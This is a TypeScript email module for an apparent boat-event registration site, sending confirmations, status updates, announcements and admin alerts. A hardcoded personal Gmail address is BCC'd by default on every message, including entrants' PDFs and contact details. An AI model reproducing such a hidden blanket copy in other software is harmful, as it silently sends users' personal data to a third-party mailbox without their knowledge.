import nodemailer from 'nodemailer'
import type { SendMailOptions } from 'nodemailer'
import { format } from 'date-fns'
import { getRegistrationNotificationEmails, getRegistrationSmtpConfig } from './config'
import type { RegistrationWithEvent } from './data'
import type { AppLocale } from '@/lib/locale'
import {
  buildNewEventAnnouncementTemplate,
  buildNoticeBoardDocumentUpdateTemplate,
  buildRegistrationConfirmationTemplate,
  buildRegistrationPaymentConfirmationTemplate,
  buildRegistrationStatusChangeTemplate,
  buildResultsPublishedTemplate,
  type EventDocumentUpdateTemplateArgs,
} from './emailTemplates'

let transport: nodemailer.Transporter | null = null

const EMAIL_BCC = 'vladislavmarinov3142@gmail.com'

type AppSendMailOptions = Omit<SendMailOptions, 'bcc'>

function getTransport() {
  if (!transport) {
    const smtp = getRegistrationSmtpConfig()
    transport = nodemailer.createTransport({
      host: smtp.host,
      port: smtp.port,
      secure: smtp.secure,
      auth: {
        user: smtp.user,
        pass: smtp.pass,
      },
    })
  }

  return transport
}

function getFromAddress() {
  const smtp = getRegistrationSmtpConfig()

  return {
    address: smtp.from,
    name: smtp.name || undefined,
  }
}

function getReplyToAddress() {
  return getRegistrationSmtpConfig().replyTo || undefined
}

function sendMail(options: AppSendMailOptions, includeBcc = true) {
  return getTransport().sendMail({
    ...options,
    ...(includeBcc ? { bcc: EMAIL_BCC } : {}),
  })
}

function formatEventDates(registration: RegistrationWithEvent) {
  if (!registration.event) {
    return 'Date unavailable'
  }

  return `${format(new Date(registration.event.start_date), 'dd.MM.yyyy')} - ${format(
    new Date(registration.event.end_date),
    'dd.MM.yyyy'
  )}`
}

export async function sendRegistrationPdfToEntrant(args: {
  registration: RegistrationWithEvent
  pdfBuffer: Buffer
  fileName: string
  generatedFormUrl: string
  locale?: AppLocale
}) {
  const { registration, pdfBuffer, fileName, generatedFormUrl, locale } = args
  const template = buildRegistrationConfirmationTemplate({
    registration,
    generatedFormUrl,
    locale,
  })

  await sendMail({
    from: getFromAddress(),
    replyTo: getReplyToAddress(),
    to: registration.contact_email,
    subject: template.subject,
    text: template.text,
    html: template.html,
    attachments: [
      {
        filename: fileName,
        content: pdfBuffer,
        contentType: 'application/pdf',
      },
    ],
  })
}

export async function sendRegistrationPaymentConfirmationToEntrant(
  registration: RegistrationWithEvent,
  locale: AppLocale = 'en'
) {
  const template = buildRegistrationPaymentConfirmationTemplate(registration, locale)

  await sendMail({
    from: getFromAddress(),
    replyTo: getReplyToAddress(),
    to: registration.contact_email,
    subject: template.subject,
    text: template.text,
    html: template.html,
  })
}

export async function sendRegistrationStatusEmail(args: {
  registration: RegistrationWithEvent
  status: 'approved' | 'rejected'
  feedback?: string | null
}) {
  const locale = args.registration.preferred_language === 'bg' ? 'bg' : 'en'
  const template = buildRegistrationStatusChangeTemplate({
    registration: args.registration,
    status: args.status,
    locale,
    feedback: args.feedback,
  })

  await sendMail({
    from: getFromAddress(),
    replyTo: getReplyToAddress(),
    to: args.registration.contact_email,
    subject: template.subject,
    text: template.text,
    html: template.html,
  })
}

export async function sendNewEventAnnouncementEmail(args: {
  to: string
  recipientName?: string | null
  eventName: string
  eventDates: string
  eventUrl: string
  prefillReferenceId?: string | null
}) {
  const template = buildNewEventAnnouncementTemplate({
    recipientName: args.recipientName,
    eventName: args.eventName,
    eventDates: args.eventDates,
    eventUrl: args.eventUrl,
    prefillReferenceId: args.prefillReferenceId,
  })

  await sendMail({
    from: getFromAddress(),
    replyTo: getReplyToAddress(),
    to: args.to,
    subject: template.subject,
    text: template.text,
    html: template.html,
  })
}

export async function sendNoticeBoardDocumentUpdateEmail(args: {
  to: string
  includeBcc?: boolean
} & EventDocumentUpdateTemplateArgs) {
  const template = buildNoticeBoardDocumentUpdateTemplate(args)

  await sendMail({
    from: getFromAddress(),
    replyTo: getReplyToAddress(),
    to: args.to,
    subject: template.subject,
    text: template.text,
    html: template.html,
  }, args.includeBcc)
}

export async function sendResultsPublishedEmail(args: {
  to: string
  includeBcc?: boolean
} & EventDocumentUpdateTemplateArgs) {
  const template = buildResultsPublishedTemplate(args)

  await sendMail({
    from: getFromAddress(),
    replyTo: getReplyToAddress(),
    to: args.to,
    subject: template.subject,
    text: template.text,
    html: template.html,
  }, args.includeBcc)
}

export async function sendRegistrationNotificationToAdmins(
  registration: RegistrationWithEvent
) {
  const recipients = getRegistrationNotificationEmails()

  if (recipients.length === 0) {
    console.warn(
      'REGISTRATION_NOTIFICATION_EMAILS is empty; admin notification email was skipped.'
    )
    return
  }

  await sendMail({
    from: getFromAddress(),
    replyTo: getReplyToAddress(),
    to: recipients,
    subject: `New event registration: ${registration.boat_name}`,
    text: [
      'A new event registration was submitted.',
      '',
      `Event: ${registration.event?.name_en ?? registration.event_id}`,
      `Dates: ${formatEventDates(registration)}`,
      `Boat: ${registration.boat_name}`,
      `Skipper: ${registration.skipper_name}`,
      `Contact: ${registration.contact_name} <${registration.contact_email}>`,
      `Phone: ${registration.contact_phone}`,
      `Registration ID: ${registration.id}`,
    ].join('\n'),
  })
}
